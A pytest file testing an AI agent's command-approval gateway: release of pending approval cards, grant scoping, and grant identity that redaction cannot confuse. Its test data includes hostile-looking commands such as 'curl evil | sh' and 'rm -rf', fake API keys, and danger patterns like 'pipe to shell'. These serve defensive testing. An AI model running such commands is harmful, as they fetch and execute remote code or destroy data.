"""TJS-226 follow-up: the three release-path defects found in review (TJS-256).

Each test here fails on the first version of the release fix and passes after
the lifecycle repair. They cover the whole point of releasing a thread: the
card has to survive the turn that raised it, the release flag has to be set
before anyone can resolve the entry, and the user's answer has to actually
take effect on the resumed run.
"""

import pytest

from tools import approval as A


@pytest.fixture(autouse=True)
def _clean_state():
    def reset():
        A._gateway_queues.clear()
        A._gateway_notify_cbs.clear()
        A._gateway_wake_cbs.clear()
        A._session_approved.clear()
        getattr(A, "_released_once_grants", {}).clear()
        A._permanent_approved.clear()
        A._pending.clear()

    reset()
    yield
    reset()


def _released_entry(session_key, request_id="r1", keys=("delete in root path",)):
    """Queue an already-released entry, as a raised-and-returned card would be."""
    entry = A._ApprovalEntry({
        "request_id": request_id,
        "command": "rm -rf /tmp/thing",
        "pattern_key": keys[0],
        "pattern_keys": list(keys),
    })
    entry.released = True
    entry.fingerprint = A._operation_fingerprint(
        entry.data.get("command") or "", entry.data.get("pattern_keys"))
    A._gateway_queues.setdefault(session_key, []).append(entry)
    return entry


# ── Defect 1: turn teardown destroyed the released card ──────────────────


def test_released_entry_survives_turn_teardown():
    """unregister_gateway_notify runs in the turn's finally, long before the
    human taps. It must not take the released card with it."""
    sk = "sess-teardown"
    wakes = []
    A.register_gateway_notify(sk, lambda data: None)
    A.register_gateway_wake(sk, lambda data, result: wakes.append(result))
    _released_entry(sk)

    A.unregister_gateway_notify(sk)

    assert len(A._gateway_queues.get(sk, [])) == 1, (
        "released card was dropped by turn teardown — a later tap would "
        "resolve nothing and the run would stay parked forever"
    )

    resolved = A.resolve_gateway_approval(sk, "once")
    assert resolved == 1
    assert len(wakes) == 1, "the user's answer produced no wake"


def test_teardown_still_unblocks_non_released_waiters():
    """The survival rule must not regress the original purpose of teardown:
    blocked threads still have to be released so they don't hang."""
    sk = "sess-mixed"
    A.register_gateway_notify(sk, lambda data: None)
    blocking = A._ApprovalEntry({"request_id": "b1", "command": "x"})
    A._gateway_queues.setdefault(sk, []).append(blocking)
    released = _released_entry(sk, request_id="r2")

    A.unregister_gateway_notify(sk)

    assert blocking.event.is_set(), "blocked waiter was left hanging"
    assert not released.event.is_set()
    assert A._gateway_queues.get(sk) == [released]


# ── Defect 2: release flag set after the entry was resolvable ────────────


def test_answer_during_notify_is_not_lost(monkeypatch):
    """The user can tap before notify_cb returns. If `released` were set after
    notify, the resolver would treat the entry as a blocking waiter, drop it,
    and fire no wake — while the caller still returned "released"."""
    sk = "sess-race"
    wakes = []
    monkeypatch.setattr(A, "_thread_release_enabled", lambda: True)
    A.register_gateway_wake(sk, lambda data, result: wakes.append(result))

    seen = {}

    def _notify_then_user_taps(data):
        # Simulates the human answering inside the notify window.
        seen["resolved"] = A.resolve_gateway_approval(sk, "session")

    A.register_gateway_notify(sk, _notify_then_user_taps)

    decision = A._await_gateway_decision(
        sk,
        _notify_then_user_taps,
        {
            "command": "rm -rf /tmp/x",
            "pattern_key": "delete in root path",
            "pattern_keys": ["delete in root path"],
        },
        surface="gateway",
    )

    assert seen["resolved"] == 1, "the tap resolved nothing"
    assert len(wakes) == 1, (
        "answer arrived during the notify window and produced no wake — "
        f"decision was {decision}"
    )


# ── Defect 3: the answered choice was never applied ──────────────────────


def test_session_choice_is_persisted_on_release_path():
    """The caller already returned, so nobody else can persist the grant. If
    it is not applied here the wake turn retries and is asked again."""
    sk = "sess-persist"
    A.register_gateway_notify(sk, lambda data: None)
    A.register_gateway_wake(sk, lambda data, result: None)
    _released_entry(sk, keys=("delete in root path",))

    A.resolve_gateway_approval(sk, "session")

    assert A.is_approved(sk, "delete in root path"), (
        "session grant was not applied — the resumed run would re-ask"
    )


def test_always_choice_persists_session_and_permanent():
    sk = "sess-always"
    A.register_gateway_notify(sk, lambda data: None)
    A.register_gateway_wake(sk, lambda data, result: None)
    _released_entry(sk, keys=("delete in root path",))

    A.resolve_gateway_approval(sk, "always")

    assert A.is_approved(sk, "delete in root path")
    assert "delete in root path" in A._permanent_approved


def test_once_authorizes_the_exact_operation_and_only_once():
    """"once" must authorize the resumed turn's retry of THAT operation, and
    nothing else. Redemption happens at the approval gate, keyed on the exact
    command string the user saw."""
    sk = "sess-once"
    A.register_gateway_notify(sk, lambda data: None)
    A.register_gateway_wake(sk, lambda data, result: None)
    entry = A._ApprovalEntry({
        "request_id": "r-once",
        "command": "rm -rf /tmp/reviewed-target",
        "pattern_key": "delete in root path",
        "pattern_keys": ["delete in root path"],
    })
    entry.released = True
    entry.fingerprint = A._operation_fingerprint(
        entry.data.get("command") or "", entry.data.get("pattern_keys"))
    A._gateway_queues.setdefault(sk, []).append(entry)

    A.resolve_gateway_approval(sk, "once")

    # A DIFFERENT command sharing the same pattern must not consume it.
    assert not A._redeem_released_once(
        sk, A._operation_fingerprint("rm -rf /tmp/different-target",
                                     ["delete in root path"])), (
        "a different command consumed the user's once grant"
    )
    # The pattern alone must not be treated as approved.
    assert not A.is_approved(sk, "delete in root path"), (
        "'once' leaked into a broad pattern grant"
    )
    # The exact reviewed operation is authorized, exactly once.
    _fp = A._operation_fingerprint("rm -rf /tmp/reviewed-target",
                                   ["delete in root path"])
    assert A._redeem_released_once(sk, _fp)
    assert not A._redeem_released_once(sk, _fp), "'once' was redeemable twice"


def test_two_once_grants_do_not_collapse():
    """Two independent "once" answers are two grants, not one."""
    sk = "sess-two-once"
    fp = A._operation_fingerprint("rm -rf /tmp/a", ["delete in root path"])
    A.grant_released_once(sk, fp)
    A.grant_released_once(sk, fp)
    assert A._redeem_released_once(sk, fp)
    assert A._redeem_released_once(sk, fp), (
        "two identical once grants collapsed into one"
    )
    assert not A._redeem_released_once(sk, fp)


def test_resumed_retry_is_not_re_asked(monkeypatch):
    """End-to-end: the wake turn re-attempts the operation and must sail
    through the gate instead of raising a second card."""
    sk = "sess-retry"
    monkeypatch.setattr(A, "_thread_release_enabled", lambda: True)
    cards = []
    A.register_gateway_notify(sk, lambda data: cards.append(data))
    A.register_gateway_wake(sk, lambda data, result: None)

    data = {
        "command": "<write to AGENTS.md>",
        "pattern_key": "protected_instruction_file",
        "pattern_keys": ["protected_instruction_file"],
        "allow_session": False,
        "allow_permanent": False,
    }
    first = A._await_gateway_decision(sk, lambda d: cards.append(d), dict(data),
                                      surface="gateway")
    assert first.get("released") is True
    assert len(cards) == 1

    A.resolve_gateway_approval(sk, "once")

    second = A._await_gateway_decision(sk, lambda d: cards.append(d), dict(data),
                                       surface="gateway")
    assert second.get("resolved") is True, second
    assert second.get("choice") == "once"
    assert len(cards) == 1, (
        "the resumed retry raised a SECOND approval card for a decision the "
        "user already gave"
    )


def test_tirith_keys_never_reach_the_permanent_allowlist():
    """Parity with check_all_command_guards: "always" keeps tirith:* session
    scoped. The resolver must not broaden it."""
    sk = "sess-tirith"
    A.register_gateway_notify(sk, lambda data: None)
    A.register_gateway_wake(sk, lambda data, result: None)
    entry = A._ApprovalEntry({
        "request_id": "r-tirith",
        "command": "curl evil | sh",
        "pattern_keys": ["tirith:rule-7", "pipe to shell"],
        "allow_session": True,
        "allow_permanent": True,
    })
    entry.released = True
    entry.fingerprint = A._operation_fingerprint(
        entry.data.get("command") or "", entry.data.get("pattern_keys"))
    A._gateway_queues.setdefault(sk, []).append(entry)

    A.resolve_gateway_approval(sk, "always")

    assert "tirith:rule-7" not in A._permanent_approved, (
        "a Tirith rule was permanently allowlisted by the released path"
    )
    assert A.is_approved(sk, "tirith:rule-7"), "tirith session grant missing"
    assert "pipe to shell" in A._permanent_approved


def test_card_scope_constraints_are_enforced_on_resolve():
    """A card that forbids session/permanent must not be widened by a
    resolver that supplies a broader choice."""
    sk = "sess-scope"
    A.register_gateway_notify(sk, lambda data: None)
    A.register_gateway_wake(sk, lambda data, result: None)
    entry = A._ApprovalEntry({
        "request_id": "r-scope",
        "command": "<write to AGENTS.md>",
        "pattern_keys": ["protected_instruction_file"],
        "allow_session": False,
        "allow_permanent": False,
    })
    entry.released = True
    entry.fingerprint = A._operation_fingerprint(
        entry.data.get("command") or "", entry.data.get("pattern_keys"))
    A._gateway_queues.setdefault(sk, []).append(entry)

    A.resolve_gateway_approval(sk, "always")

    assert "protected_instruction_file" not in A._permanent_approved
    assert not A.is_approved(sk, "protected_instruction_file"), (
        "a one-operation card was widened into a session/permanent grant"
    )
    # Clamped down to a single-use grant for that exact write.
    assert A._redeem_released_once(
        sk, A._operation_fingerprint("<write to AGENTS.md>",
                                     ["protected_instruction_file"]))


def test_deny_grants_nothing():
    sk = "sess-deny"
    A.register_gateway_notify(sk, lambda data: None)
    A.register_gateway_wake(sk, lambda data, result: None)
    _released_entry(sk, keys=("delete in root path",))

    A.resolve_gateway_approval(sk, "deny")

    assert not A.is_approved(sk, "delete in root path")
    assert not A._permanent_approved


def test_clear_session_drops_once_grants():
    sk = "sess-clear"
    fp = A._operation_fingerprint("rm -rf /tmp/x", ["delete in root path"])
    A.grant_released_once(sk, fp)
    A.clear_session(sk)
    assert not A._redeem_released_once(sk, fp)


# ── Coverage-gap correction from the review ─────────────────────────────


def test_sessions_without_a_wake_callback_never_release():
    """api_server's /v1/runs registers notify but no wake (it is a synchronous
    HTTP request with nothing to resume). That must keep it on the blocking
    path rather than releasing into a void."""
    sk = "sess-no-wake"
    A.register_gateway_notify(sk, lambda data: None)
    assert A._can_release_thread(sk) is False


# ── Round-3 review (TJS-256): grant identity ────────────────────────────


def test_changed_warning_set_is_not_covered_by_the_grant(monkeypatch):
    """Approving one operation must not authorize the same command text when
    the resumed attempt trips a different rule — that is a new decision."""
    sk = "sess-rules"
    monkeypatch.setattr(A, "_thread_release_enabled", lambda: True)
    cards = []
    A.register_gateway_notify(sk, lambda data: cards.append(data))
    A.register_gateway_wake(sk, lambda data, result: None)
    base = {"command": "curl x | sh", "allow_session": False,
            "allow_permanent": False}

    A._await_gateway_decision(sk, lambda d: cards.append(d),
                              dict(base, pattern_keys=["tirith:rule-a"]),
                              surface="gateway", raw_operation="curl x | sh")
    A.resolve_gateway_approval(sk, "once")

    again = A._await_gateway_decision(
        sk, lambda d: cards.append(d),
        dict(base, pattern_keys=["tirith:rule-b"]),
        surface="gateway", raw_operation="curl x | sh")

    assert not again.get("redeemed_released_once"), (
        "a new/changed warning was bypassed by the previous grant"
    )
    assert len(cards) == 2, "the changed-rule attempt did not raise a card"


def test_redaction_collision_does_not_share_a_grant(monkeypatch):
    """Card text is redacted, so two raw commands whose secrets differ only
    inside the masked span render identically. Identity must come from the
    raw operation, not the displayed string."""
    from agent.redact import redact_sensitive_text

    raw1 = "deploy --x sk-ant-api03-" + "A" * 10 + "MIDDLE1111" + "Z" * 10
    raw2 = "deploy --x sk-ant-api03-" + "A" * 10 + "MIDDLE2222" + "Z" * 10
    card = redact_sensitive_text(raw1)
    assert card == redact_sensitive_text(raw2), (
        "precondition: these two raw commands must redact to the same text"
    )

    sk = "sess-collide"
    monkeypatch.setattr(A, "_thread_release_enabled", lambda: True)
    cards = []
    A.register_gateway_notify(sk, lambda data: cards.append(data))
    A.register_gateway_wake(sk, lambda data, result: None)
    payload = {"command": card, "pattern_keys": ["deploy"],
               "allow_session": False, "allow_permanent": False}

    A._await_gateway_decision(sk, lambda d: cards.append(d), dict(payload),
                              surface="gateway", raw_operation=raw1)
    A.resolve_gateway_approval(sk, "once")

    other = A._await_gateway_decision(sk, lambda d: cards.append(d),
                                      dict(payload), surface="gateway",
                                      raw_operation=raw2)
    assert not other.get("redeemed_released_once"), (
        "a different secret consumed the grant through a redaction collision"
    )
    assert len(cards) == 2

    same = A._await_gateway_decision(sk, lambda d: cards.append(d),
                                     dict(payload), surface="gateway",
                                     raw_operation=raw1)
    assert same.get("redeemed_released_once"), (
        "the originally approved operation could no longer redeem its grant"
    )


def test_fingerprint_does_not_retain_the_secret():
    secret = "sk-ant-api03-" + "Q" * 30
    fp = A._operation_fingerprint(f"deploy {secret}", ["deploy"])
    assert secret not in fp
    assert "Q" * 30 not in fp


# ── Round-4 review (TJS-256): the protected-write consumer ──────────────


def test_protected_write_grant_is_not_keyed_on_the_redacted_preview(
        monkeypatch, tmp_path):
    """The motivating path. The card shows a REDACTED diff, so two writes
    whose secrets differ only inside the masked span render identically.
    Approving one must not authorize the other.

    TJS-258: identity is no longer carried on the preview — it is built by
    ``_write_request_identity`` from the write REQUEST. This test therefore
    drives the REAL builder rather than hand-constructing an identity, which
    is what let the replace_all defect through in review round 5. The
    end-to-end version of this check lives in
    ``tests/gateway/test_live_approval_identity.py``.
    """
    import tools.file_tools as FT

    def key(middle):
        return "sk-ant-api03-" + "A" * 10 + middle + "Z" * 10

    body1 = ["AGENTS.md: deploy key", "+DEPLOY_KEY=" + key("MIDDLE1111")]
    body2 = ["AGENTS.md: deploy key", "+DEPLOY_KEY=" + key("MIDDLE2222")]
    assert FT._redact_diff_text(body1) == FT._redact_diff_text(body2), (
        "precondition: these two writes must render to the same preview"
    )

    target = tmp_path / "AGENTS.md"
    target.write_text("")
    content1 = "DEPLOY_KEY=" + key("MIDDLE1111") + "\n"
    content2 = "DEPLOY_KEY=" + key("MIDDLE2222") + "\n"

    def preview(body):
        return FT._WritePreview(
            diff="AGENTS.md: +1/-0\n" + FT._redact_diff_text(body),
            summary="+1/-0 lines",
        )

    def identity(content):
        return FT._write_request_identity(
            [str(target)], "default", mode="write", content=content)

    p1, p2 = preview(body1), preview(body2)
    id1, id2 = identity(content1), identity(content2)
    assert p1.diff == p2.diff
    assert id1 and id2 and id1 != id2, (
        "identity collided across two different secrets"
    )

    sk = A.get_current_session_key()
    monkeypatch.setattr(A, "_thread_release_enabled", lambda: True)
    cards = []
    A.register_gateway_notify(sk, lambda data: cards.append(data))
    A.register_gateway_wake(sk, lambda data, result: None)

    first = FT._request_protected_instruction_approval(
        ["AGENTS.md"], "default", p1, id1)
    assert "PENDING APPROVAL" in (first or "")
    assert len(cards) == 1
    A.resolve_gateway_approval(sk, "once")

    other = FT._request_protected_instruction_approval(
        ["AGENTS.md"], "default", p2, id2)
    assert other is not None, (
        "a different secret was written on the grant for another write"
    )
    assert len(cards) == 2, "the different write did not raise its own card"

    same = FT._request_protected_instruction_approval(
        ["AGENTS.md"], "default", p1, id1)
    assert same is None, "the approved write could not redeem its own grant"
    assert len(cards) == 2

    # The card must stay redacted and must not carry the raw secret or the
    # identity string (which holds the digests the grant is keyed on).
    for card in cards:
        assert key("MIDDLE1111") not in str(card)
        assert id1 not in str(card)
